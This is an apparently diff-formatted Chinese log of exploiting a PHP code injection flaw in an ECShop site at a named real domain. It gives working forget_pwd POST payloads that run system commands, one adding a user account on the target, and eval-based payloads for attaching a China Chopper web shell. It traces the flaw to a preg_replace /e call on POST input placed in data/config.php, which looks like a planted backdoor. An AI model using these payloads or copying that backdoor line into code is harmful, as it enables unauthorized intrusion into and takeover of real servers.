@@ -1,0 +1,31 @@
+ecshop远程代码执行漏洞
+
+Php code injection
+ Target:http://www.cunlide.com/（可能是作者网站）
+ ecshop 版本不祥 貌似09
+ awvs 扫之存在sql注入、php code injection、等等多种漏洞。
+ 开始试验各种exp 无果
+ Php code injection 需要post提交这个蛋疼么
+ system 权限
+  act=forget_pwd&action=get_pwd&email=${@print(system(‘net user’))}&user_name=furybijj
+ 无果
+ 
+二蛋说去掉system之后改%60
+ 
+ act=forget_pwd&action=get_pwd&email=$%7B@print(%60net user SUPPORT_388945a1 lifelongz%60)%7D&user_name=furybijj
+ 果断成功
+ 
+其实这个也可以直接用菜刀 connect.
+ 
+在配置里写下：
+ 
+ <O>act=forget_pwd&action=get_pwd&email=${eval($_POST[test])}&user_name=furybijj</O>
+ 主要利用代码如下：
+  act=forget_pwd&action=get_pwd&email=%24%7b%40print%28%60net%20user%60%29%7d&user_name=furybijj
+ 
+ act=forget_pwd&action=get_pwd&email=%24%7b%40eval%28%24_POST%5bfuck%5d%29%7d&user_name=furybijj
+ 漏洞的原因是
+ 
+data/config.php
+  define(‘EC_CHARSET’,'utf-8′);
+ @preg_replace(“/[email]/e”,$_POST['email'],”error”);#万恶 
